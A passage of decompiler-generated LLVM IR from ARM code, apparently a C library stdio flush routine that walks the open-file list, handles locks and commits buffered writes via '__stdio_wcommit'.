  %v7_1643c = icmp slt i32 %v1_16430, 2
  br i1 %v7_1643c, label %dec_label_pc_16458, label %dec_label_pc_16440

dec_label_pc_16440:                               ; preds = %dec_label_pc_16438
  %v0_16440 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16440, i32* %r0.global-to-local, align 4
  %v0_16444 = load i32, i32* %r1.global-to-local, align 4
  %v1_16444 = add i32 %v0_16444, 129
  store i32 %v1_16444, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16458

dec_label_pc_16458:                               ; preds = %dec_label_pc_163d0, %dec_label_pc_16440, %dec_label_pc_16438
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1645c = load i32, i32* @r6, align 4
  %v2_1645c = add i32 %v0_1645c, 152
  %v3_1645c = inttoptr i32 %v2_1645c to i32*
  %v4_1645c = load i32, i32* %v3_1645c, align 4
  store i32 %v4_1645c, i32* %r5.global-to-local, align 4
  %v1_16460 = add i32 %v4_1645c, 8
  %v2_16460 = inttoptr i32 %v1_16460 to i32*
  %v3_16460 = load i32, i32* %v2_16460, align 4
  store i32 %v3_16460, i32* %r3.global-to-local, align 4
  %v1_16464 = load i32, i32* %r8.global-to-local, align 4
  %v3_16464 = icmp uge i32 %v3_16460, %v1_16464
  store i1 %v3_16464, i1* %cpsr_c.global-to-local, align 1
  %v9_16464 = icmp eq i32 %v3_16460, %v1_16464
  br i1 %v9_16464, label %dec_label_pc_164ac, label %dec_label_pc_1646c

dec_label_pc_1646c:                               ; preds = %dec_label_pc_16458
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1645c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16478123 = inttoptr i32 %v4_1645c to i32*
  %v2_16478124 = load i32, i32* %v1_16478123, align 4
  store i32 %v2_16478124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1647c126 = icmp eq i32 %v2_16478124, 0
  br i1 %v9_1647c126, label %dec_label_pc_16484, label %dec_label_pc_1649c

dec_label_pc_16484:                               ; preds = %dec_label_pc_1646c, %dec_label_pc_16484.dec_label_pc_16478_crit_edge
  %v0_16484127 = phi i32 [ %v1_1647c.pre, %dec_label_pc_16484.dec_label_pc_16478_crit_edge ], [ 0, %dec_label_pc_1646c ]
  store i32 %v0_16484127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16494 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16494, label %dec_label_pc_16498, label %dec_label_pc_16484.dec_label_pc_16478_crit_edge

dec_label_pc_16484.dec_label_pc_16478_crit_edge:  ; preds = %dec_label_pc_16484
  %v0_16478.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1647c.pre = load i32, i32* @r4, align 4
  %v1_16478 = inttoptr i32 %v0_16478.pre to i32*
  %v2_16478 = load i32, i32* %v1_16478, align 4
  store i32 %v2_16478, i32* %r3.global-to-local, align 4
  %v3_1647c = icmp uge i32 %v2_16478, %v1_1647c.pre
  store i1 %v3_1647c, i1* %cpsr_c.global-to-local, align 1
  %v9_1647c = icmp eq i32 %v2_16478, %v1_1647c.pre
  br i1 %v9_1647c, label %dec_label_pc_16484, label %dec_label_pc_1649c

dec_label_pc_16498:                               ; preds = %dec_label_pc_16484
  %v0_16498 = load i32, i32* @r4, align 4
  store i32 %v0_16498, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1649c

dec_label_pc_1649c:                               ; preds = %dec_label_pc_1646c, %dec_label_pc_16484.dec_label_pc_16478_crit_edge, %dec_label_pc_16498
  %v0_1649c = phi i32 [ %v0_16498, %dec_label_pc_16498 ], [ %v2_16478124, %dec_label_pc_1646c ], [ %v2_16478, %dec_label_pc_16484.dec_label_pc_16478_crit_edge ]
  %v1_1649c = phi i32 [ %v0_16498, %dec_label_pc_16498 ], [ 0, %dec_label_pc_1646c ], [ %v1_1647c.pre, %dec_label_pc_16484.dec_label_pc_16478_crit_edge ]
  %v3_1649c = icmp uge i32 %v0_1649c, %v1_1649c
  store i1 %v3_1649c, i1* %cpsr_c.global-to-local, align 1
  %v9_1649c = icmp eq i32 %v0_1649c, %v1_1649c
  br i1 %v9_1649c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_1649c
  %v1_164a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_164a0, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_1649c, %bb67
  %v1_164a4 = xor i1 %v9_1649c, true
  call void @__pseudo_cond_branch(i1 %v1_164a4, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_164a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_164a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_164a8 = add i32 %v1_164a8, 8
  %v3_164a8 = inttoptr i32 %v2_164a8 to i32*
  store i32 %v0_164a8, i32* %v3_164a8, align 4
  %v0_164b0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_164ac

dec_label_pc_164ac:                               ; preds = %dec_label_pc_16458, %bb68
  %v0_164bc = phi i32 [ %v0_1645c, %dec_label_pc_16458 ], [ %v0_164b0.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_164b0 = add i32 %v0_164bc, 152
  %v3_164b0 = inttoptr i32 %v2_164b0 to i32*
  %v4_164b0 = load i32, i32* %v3_164b0, align 4
  store i32 %v4_164b0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_164b8 = add i32 %v4_164b0, 4
  %v2_164b8 = inttoptr i32 %v1_164b8 to i32*
  %v3_164b8 = load i32, i32* %v2_164b8, align 4
  store i32 %v3_164b8, i32* %r1.global-to-local, align 4
  %v2_164bc = add i32 %v0_164bc, 76
  %v3_164bc = inttoptr i32 %v2_164bc to i32*
  %v4_164bc = load i32, i32* %v3_164bc, align 4
  store i32 %v4_164bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_164c0 = icmp eq i32 %v3_164b8, 0
  %v1_164c4 = inttoptr i32 %v4_164bc to i32*
  %v2_164c4 = load i32, i32* %v1_164c4, align 4
  store i32 %v2_164c4, i32* @r5, align 4
  br i1 %v2_164c0, label %dec_label_pc_164cc, label %dec_label_pc_1652c

dec_label_pc_164cc:                               ; preds = %dec_label_pc_164ac
  %v2_164cc = add i32 %v4_164b0, 8
  %v3_164cc = inttoptr i32 %v2_164cc to i32*
  store i32 0, i32* %v3_164cc, align 4
  %v0_164d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_164d0, i32* @r7, align 4
  br label %dec_label_pc_164d4

dec_label_pc_164d4:                               ; preds = %dec_label_pc_16504.dec_label_pc_164d4_crit_edge, %dec_label_pc_164cc
  %v0_164d4 = phi i32 [ %v0_164d4.pre, %dec_label_pc_16504.dec_label_pc_164d4_crit_edge ], [ %v0_164d0, %dec_label_pc_164cc ]
  %v1_164d4 = inttoptr i32 %v0_164d4 to i32*
  %v2_164d4 = load i32, i32* %v1_164d4, align 4
  store i32 %v2_164d4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_164d4, i32* %r2.global-to-local, align 4
  %v2_164e0111 = load i32, i32* %v1_164d4, align 4
  store i32 %v2_164e0111, i32* %r3.global-to-local, align 4
  %v3_164e4113 = icmp uge i32 %v2_164e0111, %v2_164d4
  store i1 %v3_164e4113, i1* %cpsr_c.global-to-local, align 1
  %v9_164e4119 = icmp eq i32 %v2_164e0111, %v2_164d4
  br i1 %v9_164e4119, label %dec_label_pc_164ec, label %dec_label_pc_16504

dec_label_pc_164ec:                               ; preds = %dec_label_pc_164d4, %dec_label_pc_164ec.dec_label_pc_164e0_crit_edge
  %v0_164ec120 = phi i32 [ %v1_164e4.pre, %dec_label_pc_164ec.dec_label_pc_164e0_crit_edge ], [ %v2_164d4, %dec_label_pc_164d4 ]
  store i32 %v0_164ec120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_164fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_164fc, label %dec_label_pc_16500, label %dec_label_pc_164ec.dec_label_pc_164e0_crit_edge

dec_label_pc_164ec.dec_label_pc_164e0_crit_edge:  ; preds = %dec_label_pc_164ec
  %v0_164e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_164e4.pre = load i32, i32* @r4, align 4
  %v1_164e0 = inttoptr i32 %v0_164e0.pre to i32*
  %v2_164e0 = load i32, i32* %v1_164e0, align 4
  store i32 %v2_164e0, i32* %r3.global-to-local, align 4
  %v3_164e4 = icmp uge i32 %v2_164e0, %v1_164e4.pre
  store i1 %v3_164e4, i1* %cpsr_c.global-to-local, align 1
  %v9_164e4 = icmp eq i32 %v2_164e0, %v1_164e4.pre
  br i1 %v9_164e4, label %dec_label_pc_164ec, label %dec_label_pc_16504

dec_label_pc_16500:                               ; preds = %dec_label_pc_164ec
  %v0_16500 = load i32, i32* @r4, align 4
  store i32 %v0_16500, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16504

dec_label_pc_16504:                               ; preds = %dec_label_pc_164d4, %dec_label_pc_164ec.dec_label_pc_164e0_crit_edge, %dec_label_pc_16500
  %v0_1650c = phi i32 [ %v0_16500, %dec_label_pc_16500 ], [ %v2_164e0111, %dec_label_pc_164d4 ], [ %v2_164e0, %dec_label_pc_164ec.dec_label_pc_164e0_crit_edge ]
  %v1_16504 = phi i32 [ %v0_16500, %dec_label_pc_16500 ], [ %v2_164d4, %dec_label_pc_164d4 ], [ %v1_164e4.pre, %dec_label_pc_164ec.dec_label_pc_164e0_crit_edge ]
  %v3_16504 = icmp uge i32 %v0_1650c, %v1_16504
  store i1 %v3_16504, i1* %cpsr_c.global-to-local, align 1
  %v9_16504 = icmp eq i32 %v0_1650c, %v1_16504
  br i1 %v9_16504, label %dec_label_pc_1650c, label %dec_label_pc_16504.dec_label_pc_164d4_crit_edge

dec_label_pc_16504.dec_label_pc_164d4_crit_edge:  ; preds = %dec_label_pc_16504
  %v0_164d4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_164d4

dec_label_pc_1650c:                               ; preds = %dec_label_pc_16504
  %v2_1650c = icmp ne i32 %v1_16504, 0
  store i1 %v2_1650c, i1* %cpsr_c.global-to-local, align 1
  %v7_16510 = icmp slt i32 %v1_16504, 2
  br i1 %v7_16510, label %dec_label_pc_1652cthread-pre-split, label %dec_label_pc_16514

dec_label_pc_16514:                               ; preds = %dec_label_pc_1650c
  %v0_16514 = load i32, i32* @r7, align 4
  store i32 %v0_16514, i32* %r0.global-to-local, align 4
  %v0_16518 = load i32, i32* %r1.global-to-local, align 4
  %v1_16518 = add i32 %v0_16518, 129
  store i32 %v1_16518, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1652cthread-pre-split

dec_label_pc_1652cthread-pre-split:               ; preds = %dec_label_pc_1650c, %dec_label_pc_16514
  %v0_16678.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1652c

dec_label_pc_1652c:                               ; preds = %dec_label_pc_1652cthread-pre-split, %dec_label_pc_164ac
  %v0_16678.pr = phi i32 [ %v0_16678.pr.pr, %dec_label_pc_1652cthread-pre-split ], [ %v2_164c4, %dec_label_pc_164ac ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1667818 = icmp eq i32 %v0_16678.pr, 0
  br i1 %v2_1667818, label %dec_label_pc_16680, label %dec_label_pc_1653c

dec_label_pc_1653c:                               ; preds = %dec_label_pc_1652c, %dec_label_pc_16674
  %v0_16564 = phi i32 [ %v3_16674, %dec_label_pc_16674 ], [ %v0_16678.pr, %dec_label_pc_1652c ]
  %v1_1653c = inttoptr i32 %v0_16564 to i16*
  %v2_1653c = load i16, i16* %v1_1653c, align 2
  %v3_1653c = zext i16 %v2_1653c to i32
  store i32 %v3_1653c, i32* %r3.global-to-local, align 4
  %v1_16540 = and i32 %v3_1653c, 64
  %v2_16540 = icmp eq i32 %v1_16540, 0
  br i1 %v2_16540, label %dec_label_pc_16674, label %dec_label_pc_16548

dec_label_pc_16548:                               ; preds = %dec_label_pc_1653c
  %v0_16548 = load i32, i32* @r6, align 4
  %v1_16548 = load i32, i32* %sb.global-to-local, align 4
  %v2_16548 = add i32 %v1_16548, %v0_16548
  %v3_16548 = inttoptr i32 %v2_16548 to i32*
  %v4_16548 = load i32, i32* %v3_16548, align 4
  store i32 %v4_16548, i32* %r3.global-to-local, align 4
  %v1_1654c = inttoptr i32 %v4_16548 to i32*
  %v2_1654c = load i32, i32* %v1_1654c, align 4
  store i32 %v2_1654c, i32* %r3.global-to-local, align 4
  %v2_16550 = icmp ugt i32 %v2_1654c, 1
  store i1 %v2_16550, i1* %cpsr_c.global-to-local, align 1
  %v7_16550 = icmp eq i32 %v2_1654c, 2
  br i1 %v7_16550, label %dec_label_pc_165b4, label %dec_label_pc_16558

dec_label_pc_16558:                               ; preds = %dec_label_pc_16548
  %v1_16558 = add i32 %v0_16564, 64
  %v2_16558 = inttoptr i32 %v1_16558 to i32*
  %v3_16558 = load i32, i32* %v2_16558, align 4
  store i32 %v3_16558, i32* %r3.global-to-local, align 4
  %v1_1655c = load i32, i32* %r8.global-to-local, align 4
  %v3_1655c = icmp uge i32 %v3_16558, %v1_1655c
  store i1 %v3_1655c, i1* %cpsr_c.global-to-local, align 1
  %v9_1655c = icmp eq i32 %v3_16558, %v1_1655c
  br i1 %v9_1655c, label %dec_label_pc_165a8, label %dec_label_pc_16564

dec_label_pc_16564:                               ; preds = %dec_label_pc_16558
  %v1_16564 = add i32 %v0_16564, 56
  store i32 %v1_16564, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16564, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1657486 = inttoptr i32 %v1_16564 to i32*
  %v2_1657487 = load i32, i32* %v1_1657486, align 4
  store i32 %v2_1657487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1657894 = icmp eq i32 %v2_1657487, 0
  br i1 %v9_1657894, label %dec_label_pc_16580, label %dec_label_pc_16598

dec_label_pc_16580:                               ; preds = %dec_label_pc_16564, %dec_label_pc_16580.dec_label_pc_16574_crit_edge
  %v0_1658095 = phi i32 [ %v1_16578.pre, %dec_label_pc_16580.dec_label_pc_16574_crit_edge ], [ 0, %dec_label_pc_16564 ]
  store i32 %v0_1658095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16590 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16590, label %dec_label_pc_16594, label %dec_label_pc_16580.dec_label_pc_16574_crit_edge

dec_label_pc_16580.dec_label_pc_16574_crit_edge:  ; preds = %dec_label_pc_16580
  %v0_16574.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16578.pre = load i32, i32* @r4, align 4
  %v1_16574 = inttoptr i32 %v0_16574.pre to i32*
  %v2_16574 = load i32, i32* %v1_16574, align 4
  store i32 %v2_16574, i32* %r3.global-to-local, align 4
  %v3_16578 = icmp uge i32 %v2_16574, %v1_16578.pre
  store i1 %v3_16578, i1* %cpsr_c.global-to-local, align 1
  %v9_16578 = icmp eq i32 %v2_16574, %v1_16578.pre
  br i1 %v9_16578, label %dec_label_pc_16580, label %dec_label_pc_16598

dec_label_pc_16594:                               ; preds = %dec_label_pc_16580
  %v0_16594 = load i32, i32* @r4, align 4
  store i32 %v0_16594, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16598

dec_label_pc_16598:                               ; preds = %dec_label_pc_16564, %dec_label_pc_16580.dec_label_pc_16574_crit_edge, %dec_label_pc_16594
  %v0_16598 = phi i32 [ %v0_16594, %dec_label_pc_16594 ], [ %v2_1657487, %dec_label_pc_16564 ], [ %v2_16574, %dec_label_pc_16580.dec_label_pc_16574_crit_edge ]
  %v1_16598 = phi i32 [ %v0_16594, %dec_label_pc_16594 ], [ 0, %dec_label_pc_16564 ], [ %v1_16578.pre, %dec_label_pc_16580.dec_label_pc_16574_crit_edge ]
  %v3_16598 = icmp uge i32 %v0_16598, %v1_16598
  store i1 %v3_16598, i1* %cpsr_c.global-to-local, align 1
  %v9_16598 = icmp eq i32 %v0_16598, %v1_16598
  br i1 %v9_16598, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_16598
  %v1_1659c = load i32, i32* @r7, align 4
  store i32 %v1_1659c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_16598, %bb69
  %v1_165a0 = xor i1 %v9_16598, true
  call void @__pseudo_cond_branch(i1 %v1_165a0, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_165a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_165a4 = load i32, i32* @r5, align 4
  %v2_165a4 = add i32 %v1_165a4, 64
  %v3_165a4 = inttoptr i32 %v2_165a4 to i32*
  store i32 %v0_165a4, i32* %v3_165a4, align 4
  %v0_165a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_165a8

dec_label_pc_165a8:                               ; preds = %dec_label_pc_16558, %bb70
  %v0_165a8 = phi i32 [ %v0_16564, %dec_label_pc_16558 ], [ %v0_165a8.pre, %bb70 ]
  %v1_165a8 = add i32 %v0_165a8, 60
  %v2_165a8 = inttoptr i32 %v1_165a8 to i32*
  %v3_165a8 = load i32, i32* %v2_165a8, align 4
  %v1_165ac = add i32 %v3_165a8, 1
  store i32 %v1_165ac, i32* %r3.global-to-local, align 4
  store i32 %v1_165ac, i32* %v2_165a8, align 4
  %v0_165b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_165b4

dec_label_pc_165b4:                               ; preds = %dec_label_pc_16548, %dec_label_pc_165a8
  %v0_165cc = phi i32 [ %v0_16564, %dec_label_pc_16548 ], [ %v0_165b4.pre, %dec_label_pc_165a8 ]
  %v1_165b4 = inttoptr i32 %v0_165cc to i16*
  %v2_165b4 = load i16, i16* %v1_165b4, align 2
  %v3_165b4 = zext i16 %v2_165b4 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_165bc = or i32 %v3_165b4, %stack_var_-44.1
  %v1_165c0 = xor i32 %v2_165bc, 320
  store i32 %v1_165c0, i32* %r3.global-to-local, align 4
  %v1_165c4 = and i32 %v1_165c0, 832
  %v2_165c4 = icmp eq i32 %v1_165c4, 0
  br i1 %v2_165c4, label %dec_label_pc_165cc, label %bb71

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165b4
  store i32 %v0_165cc, i32* %r0.global-to-local, align 4
  %v1_165d0 = call i32 @__stdio_wcommit(i32 %v0_165cc)
  store i32 %v1_165d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165d4 = icmp eq i32 %v1_165d0, 0
  br i1 %v2_165d4, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_165cc
  %v1_165d8 = load i32, i32* @r5, align 4
  %v2_165d8 = inttoptr i32 %v1_165d8 to i16*
  %v3_165d8 = load i16, i16* %v2_165d8, align 2
  %v4_165d8 = zext i16 %v3_165d8 to i32
  store i32 %v4_165d8, i32* %r3.global-to-local, align 4
  %v2_165dc = add i32 %v1_165d8, 8
  %v3_165dc = inttoptr i32 %v2_165dc to i32*
  %v4_165dc = load i32, i32* %v3_165dc, align 4
  store i32 %v4_165dc, i32* %r2.global-to-local, align 4
  %v2_165e0 = and i32 %v4_165d8, 65471
  store i32 %v2_165e0, i32* %r3.global-to-local, align 4
  %v3_165e4 = add i32 %v1_165d8, 28
  %v4_165e4 = inttoptr i32 %v3_165e4 to i32*
  store i32 %v4_165dc, i32* %v4_165e4, align 4
  %v1_165e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_165e8 = trunc i32 %v1_165e8 to i16
  %v3_165e8 = load i32, i32* @r5, align 4
  %v4_165e8 = inttoptr i32 %v3_165e8 to i16*
  store i16 %v2_165e8, i16* %v4_165e8, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_165cc
  %v1_165ec = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_165ec, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_165b4, %.thread7
  %v0_165f0 = load i32, i32* @r6, align 4
  %v1_165f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_165f0 = add i32 %v1_165f0, %v0_165f0
  %v3_165f0 = inttoptr i32 %v2_165f0 to i32*
  %v4_165f0 = load i32, i32* %v3_165f0, align 4
  store i32 %v4_165f0, i32* %r3.global-to-local, align 4
  %v1_165f4 = inttoptr i32 %v4_165f0 to i32*
  %v2_165f4 = load i32, i32* %v1_165f4, align 4
  store i32 %v2_165f4, i32* %r3.global-to-local, align 4
  %v2_165f8 = icmp ugt i32 %v2_165f4, 1
  store i1 %v2_165f8, i1* %cpsr_c.global-to-local, align 1
  %v7_165f8 = icmp eq i32 %v2_165f4, 2
  br i1 %v7_165f8, label %dec_label_pc_16674, label %dec_label_pc_16600

dec_label_pc_16600:                               ; preds = %bb71
  %v0_16600 = load i32, i32* @r5, align 4
  %v1_16600 = add i32 %v0_16600, 60
  %v2_16600 = inttoptr i32 %v1_16600 to i32*
  %v3_16600 = load i32, i32* %v2_16600, align 4
  %v1_16604 = add i32 %v3_16600, -1
  store i32 %v1_16604, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16608 = icmp eq i32 %v1_16604, 0
  store i32 %v1_16604, i32* %v2_16600, align 4
  br i1 %v2_16608, label %dec_label_pc_16614, label %dec_label_pc_16674

dec_label_pc_16614:                               ; preds = %dec_label_pc_16600
  %v0_16614 = load i32, i32* %r3.global-to-local, align 4
  %v1_16614 = load i32, i32* @r5, align 4
  %v2_16614 = add i32 %v1_16614, 64
  %v3_16614 = inttoptr i32 %v2_16614 to i32*
  store i32 %v0_16614, i32* %v3_16614, align 4
  %v0_16618 = load i32, i32* @r5, align 4
  %v1_16618 = add i32 %v0_16618, 56
  store i32 %v1_16618, i32* @r7, align 4
  br label %dec_label_pc_1661c

dec_label_pc_1661c:                               ; preds = %dec_label_pc_1664c.dec_label_pc_1661c_crit_edge, %dec_label_pc_16614
  %v0_16624 = phi i32 [ %v0_16624.pre, %dec_label_pc_1664c.dec_label_pc_1661c_crit_edge ], [ %v1_16618, %dec_label_pc_16614 ]
  %v0_1661c = phi i32 [ %v0_1661c.pre, %dec_label_pc_1664c.dec_label_pc_1661c_crit_edge ], [ %v0_16618, %dec_label_pc_16614 ]
  %v1_1661c = add i32 %v0_1661c, 56
  %v2_1661c = inttoptr i32 %v1_1661c to i32*
  %v3_1661c = load i32, i32* %v2_1661c, align 4
  store i32 %v3_1661c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16624, i32* %r2.global-to-local, align 4
  %v1_1662897 = inttoptr i32 %v0_16624 to i32*
  %v2_1662898 = load i32, i32* %v1_1662897, align 4
  store i32 %v2_1662898, i32* %r3.global-to-local, align 4
  %v3_1662c100 = icmp uge i32 %v2_1662898, %v3_1661c
  store i1 %v3_1662c100, i1* %cpsr_c.global-to-local, align 1
  %v9_1662c106 = icmp eq i32 %v2_1662898, %v3_1661c
  br i1 %v9_1662c106, label %dec_label_pc_16634, label %dec_label_pc_1664c

dec_label_pc_16634:                               ; preds = %dec_label_pc_1661c, %dec_label_pc_16634.dec_label_pc_16628_crit_edge
  %v0_16634107 = phi i32 [ %v1_1662c.pre, %dec_label_pc_16634.dec_label_pc_16628_crit_edge ], [ %v3_1661c, %dec_label_pc_1661c ]
  store i32 %v0_16634107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16644 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16644, label %dec_label_pc_16648, label %dec_label_pc_16634.dec_label_pc_16628_crit_edge

dec_label_pc_16634.dec_label_pc_16628_crit_edge:  ; preds = %dec_label_pc_16634
  %v0_16628.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1662c.pre = load i32, i32* @r4, align 4
  %v1_16628 = inttoptr i32 %v0_16628.pre to i32*
  %v2_16628 = load i32, i32* %v1_16628, align 4
  store i32 %v2_16628, i32* %r3.global-to-local, align 4
  %v3_1662c = icmp uge i32 %v2_16628, %v1_1662c.pre
  store i1 %v3_1662c, i1* %cpsr_c.global-to-local, align 1
  %v9_1662c = icmp eq i32 %v2_16628, %v1_1662c.pre
  br i1 %v9_1662c, label %dec_label_pc_16634, label %dec_label_pc_1664c

dec_label_pc_16648:                               ; preds = %dec_label_pc_16634
  %v0_16648 = load i32, i32* @r4, align 4
  store i32 %v0_16648, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1664c

dec_label_pc_1664c:                               ; preds = %dec_label_pc_1661c, %dec_label_pc_16634.dec_label_pc_16628_crit_edge, %dec_label_pc_16648
  %v0_16654 = phi i32 [ %v0_16648, %dec_label_pc_16648 ], [ %v2_1662898, %dec_label_pc_1661c ], [ %v2_16628, %dec_label_pc_16634.dec_label_pc_16628_crit_edge ]
  %v1_1664c = phi i32 [ %v0_16648, %dec_label_pc_16648 ], [ %v3_1661c, %dec_label_pc_1661c ], [ %v1_1662c.pre, %dec_label_pc_16634.dec_label_pc_16628_crit_edge ]
  %v3_1664c = icmp uge i32 %v0_16654, %v1_1664c
  store i1 %v3_1664c, i1* %cpsr_c.global-to-local, align 1
  %v9_1664c = icmp eq i32 %v0_16654, %v1_1664c
  br i1 %v9_1664c, label %dec_label_pc_16654, label %dec_label_pc_1664c.dec_label_pc_1661c_crit_edge

dec_label_pc_1664c.dec_label_pc_1661c_crit_edge:  ; preds = %dec_label_pc_1664c
  %v0_1661c.pre = load i32, i32* @r5, align 4
  %v0_16624.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1661c

dec_label_pc_16654:                               ; preds = %dec_label_pc_1664c
  %v2_16654 = icmp ne i32 %v1_1664c, 0
  store i1 %v2_16654, i1* %cpsr_c.global-to-local, align 1
  %v7_16658 = icmp slt i32 %v1_1664c, 2
  br i1 %v7_16658, label %dec_label_pc_16674, label %dec_label_pc_1665c

dec_label_pc_1665c:                               ; preds = %dec_label_pc_16654
  %v0_1665c = load i32, i32* @r5, align 4
  %v1_1665c = add i32 %v0_1665c, 56
  store i32 %v1_1665c, i32* %r0.global-to-local, align 4
  %v0_16660 = load i32, i32* %r1.global-to-local, align 4
  %v1_16660 = add i32 %v0_16660, 129
  store i32 %v1_16660, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16674

dec_label_pc_16674:                               ; preds = %dec_label_pc_16600, %dec_label_pc_1665c, %dec_label_pc_16654, %bb71, %dec_label_pc_1653c
  %v0_16674 = load i32, i32* @r5, align 4
  %v1_16674 = add i32 %v0_16674, 32
  %v2_16674 = inttoptr i32 %v1_16674 to i32*
  %v3_16674 = load i32, i32* %v2_16674, align 4
  store i32 %v3_16674, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16678 = icmp eq i32 %v3_16674, 0
  br i1 %v2_16678, label %dec_label_pc_16680, label %dec_label_pc_1653c

dec_label_pc_16680:                               ; preds = %dec_label_pc_16674, %dec_label_pc_1652c
  %v0_16680 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_16680, i32* %r0.global-to-local, align 4
  %v0_166bc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16688:                               ; preds = %dec_label_pc_16364
  %v3_16688 = load i16, i16* %arg1, align 2
  %v4_16688 = zext i16 %v3_16688 to i32
  %v1_1668c = and i32 %v4_16688, 64
  store i32 %v1_1668c, i32* %r3.global-to-local, align 4
  %v2_1668c = icmp eq i32 %v1_1668c, 0
  br i1 %v2_1668c, label %bb72, label %dec_label_pc_16698

bb72:                                             ; preds = %dec_label_pc_16688
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16698:                               ; preds = %dec_label_pc_16688
  %v2_16698 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_16698, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1669c = icmp eq i32 %v2_16698, 0
  br i1 %v2_1669c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_16698
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_16698
  %v1_166a0 = load i32, i32* @r4, align 4
  %v2_166a0 = inttoptr i32 %v1_166a0 to i16*
  %v3_166a0 = load i16, i16* %v2_166a0, align 2
  %v4_166a0 = zext i16 %v3_166a0 to i32
  store i32 %v4_166a0, i32* %r3.global-to-local, align 4
  %v2_166a4 = add i32 %v1_166a0, 8
  %v3_166a4 = inttoptr i32 %v2_166a4 to i32*
  %v4_166a4 = load i32, i32* %v3_166a4, align 4
  store i32 %v4_166a4, i32* %r2.global-to-local, align 4
